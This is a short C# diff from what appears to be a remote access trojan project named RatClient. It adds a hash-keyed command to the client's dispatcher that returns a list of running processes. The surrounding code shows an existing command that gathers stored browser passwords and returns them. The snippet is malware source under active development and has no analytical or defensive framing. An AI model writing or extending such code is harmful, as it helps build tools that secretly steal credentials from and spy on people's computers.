@@ -1,4 +1,5 @@
 ﻿using RatClient.WebGather;
+using RatClient.ProcManage;
 using System;
 using System.Xml;
 
@@ -32,6 +33,10 @@ namespace RatClient
                 byte[] test =  Passwords.Gather(web, type);
                 Console.WriteLine(test.Length);
                 return test;
+            }
+            else if(command== "be425fd08e9ea24230bac47493228ada")
+            {
+                return ProcInfo.GetFormatedProcesses();
             }
             else
             {
